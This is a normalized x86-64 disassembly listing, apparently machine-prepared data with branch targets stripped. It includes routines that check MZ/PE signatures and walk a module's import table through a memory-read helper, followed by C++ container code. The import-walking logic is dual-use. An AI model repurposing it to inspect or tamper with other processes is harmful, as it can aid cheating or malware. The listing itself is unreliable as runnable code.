call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax 0x5a4d
cmp [ rsi ] ax
jne r-xdata
mov ecx 0x108
call j_sub_14003ac60
mov rbx rax
mov [ rsp + 0x50 ] rax
movsxd rcx [ rsi + 0x3c ]
add rcx r14
mov r9 rdi
mov r8d 0x108
mov rdx rax
call sub_140006810
test al al
je r-xdata
mov rcx rbx
call j_sub_14003ad04#2
mov edx 0x108
mov rcx rbx
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
cmp [ rbx ] 0x4550
jne r-xdata
cmp [ rbx + 0x90 ] eax
je r-xdata
mov eax [ rbx + 0x94 ]
test eax eax
je r-xdata
mov ecx eax
call j_sub_14003ac60
mov r12 rax
mov [ rsp + 0x60 ] rax
mov r8d [ rbx + 0x94 ]
mov ecx [ rbx + 0x90 ]
add rcx r14
mov r9 rdi
mov rdx rax
call sub_140006810
test al al
je r-xdata
mov rcx r12
call j_sub_14003ad04#2
mov edx 0x14
mov rcx r12
call [ IsBadReadPtr@IAT ]
test eax eax
sete r13b
mov [ rsp + 0x31 ] r13b
test r13b r13b
je r-xdata
cmp [ r12 ] 0x0
je r-xdata
lea r15 [ r12 + 0xc ]
xor r12d r12d
nop
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04#2
mov rcx r12
call j_sub_14003ad04#2
mov [ rsp + 0x30 ] 0x0
mov edi [ r15 ]
add rdi r14
xor r12d r12d
mov [ rsp + 0x40 ] r12
lea rdx [ rdi + 0xff ]
mov r13 [ rsp + 0x48 ]
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] 0x1
lea r9 [ rsp + 0x40 ]
lea r8 [ rsp + 0x30 ]
mov rcx rdi
call sub_1400069a0
mov ecx [ rsp + 0x40 ]
sub ecx edi
test al al
je r-xdata
mov rsi [ rsp + 0x48 ]
mov rbx [ rsp + 0x38 ]
nop [ rax + rax ] eax
add r15 0x14
test rsi rsi
je r-xdata
lea eax [ rcx + 0x1 ]
movsxd rdi eax
mov rcx rdi
call j_sub_14003ac60
mov r12 rax
mov ecx [ r15 ]
add rcx r14
mov r9 r13
mov r8 rdi
mov rdx rax
call sub_140006810
test al al
je r-xdata
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x70 ]
mov rcx [ r12 ]
test rcx rcx
je r-xdata
cmp [ r15 - 0xc ] 0x0
mov rdi [ rsp + 0x48 ]
jne r-xdata
cmp rsi rbx
je r-xdata
mov rcx r12
call j_sub_14003ad04#2
xor r12d r12d
mov [ rbp - 0x50 ] 0xf
xor r13d r13d
mov [ rbp - 0x58 ] r13
mov [ rbp - 0x68 ] r13b
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
lea rcx [ rbp - 0x68 ]
call sub_140005c90
nop
lea r8 [ rsp + 0x70 ]
lea rdx [ rbp - 0x68 ]
lea rcx [ rbp - 0x40 ]
call sub_14000de00
nop
mov rdx rax
mov rcx [ rsp + 0x68 ]
call sub_14000d380
nop
lea rcx [ rbp - 0x18 ]
call sub_14000d6c0
cmp [ rbp - 0x28 ] 0x10
jb r-xdata
mov eax [ r15 + 0x4 ]
add rax rdi
add rax r14
mov [ rbp - 0x40 ] rax
mov rax [ rbx ]
mov [ rbp - 0x38 ] rax
xor eax eax
mov [ rbp - 0x30 ] ax
mov [ rbp - 0x10 ] 0xf
mov [ rbp - 0x18 ] rax
mov [ rbp - 0x28 ] al
mov rdx 0x8000000000000000
test rdx rcx
je r-xdata
mov r13d r12d
mov ecx 0x8
call j_sub_14003ac60
mov r12 rax
mov ecx 0x8
call j_sub_14003ac60
mov [ rsp + 0x38 ] rax
xor eax eax
mov esi eax
mov [ rsp + 0x70 ] rax
mov ebx eax
mov [ rsp + 0x78 ] rax
mov [ rbp - 0x80 ] rax
mov ecx [ r15 - 0xc ]
add rcx r14
mov r9 rdi
lea r8d [ rax + 0x8 ]
mov rdx r12
call sub_140006810
test al al
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov r12 [ rsp + 0x60 ]
movzx r13d [ rsp + 0x31 ]
mov rcx rsi
call j_sub_14003ad04
lea rdi [ rsi + 0x30 ]
nop [ rax ] eax
mov [ rbp - 0x28 ] 0xf
mov [ rbp - 0x30 ] r13
mov [ rbp - 0x40 ] 0x0
cmp [ rbp - 0x50 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x40 ]
call j_sub_14003ad04
mov [ rsp + 0x30 ] 0x0
lea rdi [ rcx + r14 + 0x2 ]
mov [ rsp + 0x40 ] rax
lea rdx [ rdi + 0xff ]
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] 0x1
lea r9 [ rsp + 0x40 ]
lea r8 [ rsp + 0x30 ]
mov rcx rdi
call sub_1400069a0
mov ecx [ rsp + 0x40 ]
sub ecx edi
test al al
je r-xdata
mov [ rbp - 0x30 ] cx
jmp r-xdata
mov [ rdi ] 0xf
mov [ rdi - 0x8 ] r12
mov [ rdi - 0x18 ] 0x0
add rdi 0x40
lea rax [ rdi - 0x30 ]
cmp rax rbx
jne r-xdata
mov rcx [ rdi - 0x18 ]
call j_sub_14003ad04
mov rcx [ rbp - 0x68 ]
call j_sub_14003ad04
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x70 ]
call sub_14000d270
inc r13d
cmp [ rbp - 0x10 ] 0x10
jb r-xdata
movsxd rdi ecx
lea rcx [ rdi + 0x4 ]
call j_sub_14003ac60
mov rbx rax
mov rax [ r12 ]
lea rcx [ r14 + rax ]
mov r9 rsi
lea r8 [ rdi + 0x4 ]
mov rdx rbx
call sub_140006810
test al al
je r-xdata
cmp [ rdi ] 0x10
jb r-xdata
mov eax [ r15 - 0xc ]
lea rcx [ r14 + rax ]
lea rcx [ rcx + r13 * 8 ]
mov r9 rsi
mov r8d 0x8
mov rdx r12
call sub_140006810
test al al
jne r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_14003ad04
mov rcx rbx
call j_sub_14003ad04#2
mov rbx [ rsp + 0x38 ]
lea rdx [ rbx + 0x2 ]
mov [ rbp - 0x50 ] 0xf
mov [ rbp - 0x58 ] 0x0
mov [ rbp - 0x68 ] 0x0
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x68 ]
call sub_140005c90
nop
cmp [ rbp - 0x10 ] 0x10
jb r-xdata
mov edi r13d
shl rdi 0x3
mov ecx [ r15 + 0x4 ]
add rcx rdi
add rcx r14
mov r9 rsi
mov r8d 0x8
mov rdx rbx
call sub_140006810
test al al
je r-xdata
mov [ rbp - 0x10 ] 0xf
mov [ rbp - 0x18 ] 0x0
mov [ rbp - 0x28 ] 0x0
mov rcx [ rbp - 0x50 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_14003ad04
mov rax [ rbp - 0x68 ]
mov [ rbp - 0x28 ] rax
mov r8 [ rbp - 0x58 ]
inc r8
lea rdx [ rbp - 0x68 ]
lea rcx [ rbp - 0x28 ]
call sub_14003a8c0
mov rcx [ rbp - 0x50 ]
jmp r-xdata
mov rax [ rbp - 0x58 ]
mov [ rbp - 0x18 ] rax
mov [ rbp - 0x10 ] rcx
sub_14000d140
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
xor dil dil
mov rbp r8
mov r12 rdx
mov esi ecx
test r8 r8
jne r-xdata
mov rbx r8
lea ecx [ r8 + 0x20 ]
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
test rbp rbp
jne r-xdata
cmp [ rdx + 0x8 ] esi
sete dil
test dil dil
jne r-xdata
mov rbx rax
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
movzx eax dil
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
test rbx rbx
je r-xdata
mov eax [ rdx ]
lea rcx [ r12 + 0x30 ]
add rdx 0x30
mov [ r12 ] eax
mov eax [ rdx - 0x2c ]
or r9 0xffffffffffffffff
mov [ r12 + 0x4 ] eax
mov eax [ rdx - 0x28 ]
xor r8d r8d
mov [ r12 + 0x8 ] eax
mov rax [ rdx - 0x20 ]
mov [ r12 + 0x10 ] rax
mov eax [ rdx - 0x18 ]
mov [ r12 + 0x18 ] eax
mov eax [ rdx - 0x14 ]
mov [ r12 + 0x1c ] eax
mov eax [ rdx - 0x10 ]
mov [ r12 + 0x20 ] eax
mov eax [ rdx - 0xc ]
mov [ r12 + 0x24 ] eax
mov eax [ rdx - 0x8 ]
mov [ r12 + 0x28 ] eax
call sub_140001dd0
add rdx 0x58
cmp rdx rax
jne r-xdata
jmp r-xdata
xor edx edx
mov rcx rbx
call sub_14000c0b0
test al al
je r-xdata
mov rcx rbx
call sub_14000d510
mov rcx rbx
call j_sub_14003ad04
jmp r-xdata
mov rdx [ rbx ]
mov rax [ rbx + 0x8 ]
cmp rdx rax
je r-xdata
sub_14000d270
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rax [ rcx + 0x8 ]
cmp rdx rax
jae r-xdata
cmp rax [ rbx + 0x10 ]
jne r-xdata
mov rcx [ rcx ]
cmp rcx rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000d630
sub rdi rcx
cmp rax [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x40
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rax [ rdi ]
mov [ rcx ] rax
mov rax [ rdi + 0x8 ]
mov [ rcx + 0x8 ] rax
movzx eax [ rdi + 0x10 ]
mov [ rcx + 0x10 ] ax
add rcx 0x18
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] 0x0
lea rdx [ rdi + 0x18 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140005f40
nop
and rdi 0xffffffffffffffc0
add rdi [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000d630
jmp r-xdata
mov rax [ rdi ]
mov [ rcx ] rax
mov rax [ rdi + 0x8 ]
mov [ rcx + 0x8 ] rax
movzx eax [ rdi + 0x10 ]
mov [ rcx + 0x10 ] ax
add rcx 0x18
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] 0x0
lea rdx [ rdi + 0x18 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140005f40
nop
sub_14000d380
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000d750
sub rdi rax
mov rax 0xe38e38e38e38e39
imul rdi
mov rdi rdx
sar rdi 0x2
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x48
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
lea r8 [ rdi + 0x28 ]
mov rdx rdi
call sub_14000e050
nop
lea rcx [ rdi + rdi * 8 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000d750
jmp r-xdata
lea r8 [ rdx + 0x28 ]
call sub_14000e050
nop
sub_14000d450
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x2e8ba2e8ba2e8ba3
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x2e8ba2e8ba2e8b9
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x2e8ba2e8ba2e8ba
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_14000d810
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_14000d810
sub_14000d510
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rsi [ rcx ]
xor r12d r12d
mov rdi rcx
test rsi rsi
je r-xdata
mov rsi [ rsp + 0x40 ]
mov [ rdi ] r12
mov [ rdi + 0x8 ] r12
mov [ rdi + 0x10 ] r12
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov [ rsp + 0x38 ] rbp
mov rbp [ rcx + 0x8 ]
cmp rsi rbp
je r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov rbp [ rsp + 0x38 ]
mov [ rsp + 0x30 ] rbx
lea rbx [ rsi + 0x48 ]
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] r12
add rsi 0x58
mov [ rbx - 0x18 ] r12w
add rbx 0x58
cmp rsi rbp
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
mov rbx [ rsp + 0x30 ]
sub_14000d5a0
sub rsp 0x28
mov rax [ rcx ]
mov r8 [ rcx + 0x8 ]
mov r9 rcx
sub r8 rax
mov rcx 0x1fffffffffffffe
sar r8 0x7
cmp r8 rcx
jbe r-xdata
mov rdx [ r9 + 0x10 ]
inc r8
sub rdx rax
sar rdx 0x7
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x1ffffffffffffff
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_14000d9b0
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_14000d9b0
sub_14000d630
sub rsp 0x28
mov rax [ rcx ]
mov r8 [ rcx + 0x8 ]
mov r9 rcx
sub r8 rax
mov rcx 0x3fffffffffffffe
sar r8 0x6
cmp r8 rcx
jbe r-xdata
mov rdx [ r9 + 0x10 ]
inc r8
sub rdx rax
sar rdx 0x6
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x3ffffffffffffff
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_14000dac0
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_14000dac0
sub_14000d6c0
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rdi [ rcx ]
xor r12d r12d
mov rsi rcx
test rdi rdi
je r-xdata
mov rdi [ rsp + 0x48 ]
mov [ rsi ] r12
mov [ rsi + 0x8 ] r12
mov [ rsi + 0x10 ] r12
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
mov [ rsp + 0x38 ] rbp
mov rbp [ rcx + 0x8 ]
cmp rdi rbp
je r-xdata
mov rcx [ rsi ]
call j_sub_14003ad04
mov rbp [ rsp + 0x38 ]
mov [ rsp + 0x30 ] rbx
lea rbx [ rdi + 0x30 ]
mov [ rbx ] 0xf
mov [ rbx - 0x8 ] r12
add rdi 0x40
mov [ rbx - 0x18 ] r12b
add rbx 0x40
cmp rdi rbp
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
cmp [ rbx ] 0x10
jb r-xdata
mov rbx [ rsp + 0x30 ]
sub_14000d750
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0xe38e38e38e38e39
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x2
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x38e38e38e38e38d
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x38e38e38e38e38e
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_14000dbe0
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_14000dbe0
sub_14000d810
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rbx rdx
mov rsi rcx
mov rax 0x2e8ba2e8ba2e8ba
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x2e8ba2e8ba2e8ba3
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rbx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor edi edi
mov [ rsp + 0x58 ] rdi
test rbx rbx
je r-xdata
mov r8 rdi
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_14000e0f0
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
mov rcx rbx
imul rcx rcx 0x58
call sub_14003ac60
mov rdi rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
imul rbx rbx 0x58
add rbx rdi
mov [ rsi + 0x10 ] rbx
imul r12 r12 0x58
add r12 rdi
mov [ rsi + 0x8 ] r12
mov [ rsi ] rdi
mov rdx r9
call sub_14000d950
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_14000d950
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x48 ]
nop [ rax ] eax
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] si
add rbx 0x58
lea rax [ rbx - 0x48 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_14000d9b0
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rbx rdx
mov rdi rcx
mov rax 0x1ffffffffffffff
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x10 ]
sub rax [ rcx ]
sar rax 0x7
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor esi esi
mov [ rsp + 0x58 ] rsi
test rdx rdx
je r-xdata
mov r8 rsi
mov rdx [ rdi + 0x8 ]
mov rcx [ rdi ]
call sub_14000e1b0
nop
mov rdx [ rdi + 0x8 ]
mov rcx [ rdi ]
mov r12 rdx
sub r12 rcx
test rcx rcx
je r-xdata
mov rcx rdx
shl rcx 0x7
call sub_14003ac60
mov rsi rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
shl rbx 0x7
add rbx rsi
mov [ rdi + 0x10 ] rbx
and r12 0xffffffffffffff80
add r12 rsi
mov [ rdi + 0x8 ] r12
mov [ rdi ] rsi
call sub_14000de60
mov rcx [ rdi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_14000dac0
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rdi rdx
mov rbx rcx
mov rax 0x3ffffffffffffff
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x10 ]
sub rax [ rcx ]
sar rax 0x6
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
mov rcx rdx
call sub_14000dd20
mov r12 rax
mov [ rsp + 0x48 ] rax
mov r8 rax
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
call sub_14000e210
nop
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
mov rsi rdx
sub rsi rcx
test rcx rcx
je r-xdata
shl rdi 0x6
add rdi r12
mov [ rbx + 0x10 ] rdi
and rsi 0xffffffffffffffc0
add rsi r12
mov [ rbx + 0x8 ] rsi
mov [ rbx ] r12
call sub_14000db80
mov rcx [ rbx ]
call j_sub_14003ad04
sub_14000db80
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x30 ]
nop [ rax ] eax
mov [ rbx ] 0xf
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] sil
add rbx 0x40
lea rax [ rbx - 0x30 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
cmp [ rbx ] 0x10
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_14000dbe0
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rsi rcx
mov rax 0x38e38e38e38e38e
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0xe38e38e38e38e39
mov rax r12
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_14000e2f0
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x2
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
lea rcx [ rdi + rdi * 8 ]
shl rcx 0x3
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rdi + rdi * 8 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x10 ] rcx
lea rax [ r12 + r12 * 8 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x8 ] rcx
mov [ rsi ] rbx
mov rdx r9
call sub_14000dd90
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_14000dd20
sub rsp 0x48
xor eax eax
test rcx rcx
je r-xdata
add rsp 0x48
retn
mov rax 0x3ffffffffffffff
cmp rcx rax
ja r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_14003a774
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_14003f22c
int3
shl rcx 0x6
call sub_14003ac60
test rax rax
jne r-xdata
sub_14000dd90
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x18 ]
nop [ rax ] eax
mov [ rbx ] 0xf
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] sil
add rbx 0x48
lea rax [ rbx - 0x18 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
lea rcx [ rbx + 0x10 ]
call sub_14000d6c0
cmp [ rbx ] 0x10
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_14000de00
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx r8
mov rdi rcx
xor eax eax
mov [ rsp + 0x58 ] eax
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] rax
mov [ rcx ] al
call sub_140005eb0
nop
lea rcx [ rdi + 0x28 ]
mov rdx rbx
call sub_14000e390
nop
mov rax rdi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_14000de60
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x70 ]
nop [ rax ] eax
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] si
cmp [ rbx - 0x28 ] 0x8
jb r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
mov [ rbx - 0x28 ] 0x7
mov [ rbx - 0x30 ] rsi
mov [ rbx - 0x40 ] si
sub rbx 0xffffffffffffff80
lea rax [ rbx - 0x70 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x40 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_14000dee0
push rbx
sub rsp 0x20
mov eax [ rdx ]
mov rbx rcx
add rcx 0x30
mov [ rcx - 0x30 ] eax
mov eax [ rdx + 0x4 ]
add rdx 0x30
mov [ rcx - 0x2c ] eax
mov eax [ rdx - 0x28 ]
or r9 0xffffffffffffffff
mov [ rcx - 0x28 ] eax
mov rax [ rdx - 0x20 ]
xor r8d r8d
mov [ rcx - 0x20 ] rax
mov eax [ rdx - 0x18 ]
mov [ rcx - 0x18 ] eax
mov eax [ rdx - 0x14 ]
mov [ rcx - 0x14 ] eax
mov eax [ rdx - 0x10 ]
mov [ rcx - 0x10 ] eax
mov eax [ rdx - 0xc ]
mov [ rcx - 0xc ] eax
mov eax [ rdx - 0x8 ]
mov [ rcx - 0x8 ] eax
xor eax eax
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
call sub_140001dd0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14000df50
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov eax [ rdx ]
mov [ rcx ] eax
mov eax [ rdx + 0x4 ]
